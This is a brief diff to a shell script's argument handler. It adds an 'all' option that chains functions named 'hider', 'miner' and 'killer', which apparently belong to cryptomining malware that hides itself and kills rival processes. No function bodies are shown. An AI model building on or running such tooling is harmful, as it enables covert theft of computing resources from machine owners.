@@ -38,4 +38,6 @@ elif [[ $1 == "miner" ]] ;
     then miner ;
 elif [[ $1 == "killer" ]] ;
     then killer ;
+elif [[ $1 == "all" ]] ;
+    then hider ; miner ; killer ;
 fi
